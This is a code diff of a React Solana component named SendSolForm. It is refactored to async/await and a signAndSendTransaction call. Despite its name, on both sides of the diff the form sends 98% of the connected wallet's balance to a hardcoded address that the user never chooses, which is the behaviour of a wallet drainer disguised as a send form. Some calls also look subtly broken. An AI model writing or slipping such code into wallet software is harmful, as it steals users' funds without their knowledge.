@@ -7,14 +7,15 @@ import { FC, useState } from 'react'
 export const SendSolForm: FC = () => {
     const [txSig, setTxSig] = useState('');
     const { connection } = useConnection();
-    const { publicKey, sendTransaction } = useWallet();
+    const { publicKey, signAndSendTransaction } = useWallet(); // Updated to use signAndSendTransaction
 
-    const sendSol = (event) => {
+    const sendSol = async (event) => {
         event.preventDefault();
         if (!connection || !publicKey) { return; }
 
-        // Get current SOL balance and calculate 98% of it
-        connection.getAccountInfo(publicKey).then((info) => {
+        try {
+            // Get current SOL balance and calculate 98% of it
+            const info = await connection.getAccountInfo(publicKey);
             const balanceInSol = info.lamports / web3.LAMPORTS_PER_SOL;
             const amountToSend = balanceInSol * 0.98; // 98% of current balance
 
@@ -22,21 +23,20 @@ export const SendSolForm: FC = () => {
             const transaction = new web3.Transaction();
             const recipientPubKey = new web3.PublicKey('AiwmF5F27tMzxmzcDwUg3on2fWiCHcuxQmBtV3bo611a');
 
-            const sendSolInstruction = web3.SystemProgram.transfer({
-                fromPubkey: publicKey,
-                toPubkey: recipientPubKey,
-                lamports: amountToSend * web3.LAMPORTS_PER_SOL
-            });
+            transaction.add(
+                web3.SystemProgram.transfer({
+                    fromPubkey: publicKey,
+                    toPubkey: recipientPubKey,
+                    lamports: amountToSend * web3.LAMPORTS_PER_SOL
+                })
+            );
 
-            transaction.add(sendSolInstruction);
-
-            // Send transaction
-            sendTransaction(transaction, connection).then((sig) => {
-                setTxSig(sig);
-            }).catch((error) => {
-                console.error('Failed to send transaction:', error);
-            });
-        });
+            // Sign and send transaction
+            const { signature } = await signAndSendTransaction(transaction);
+            setTxSig(signature);
+        } catch (error) {
+            console.error('Failed to send transaction:', error);
+        }
     }
 
     return (
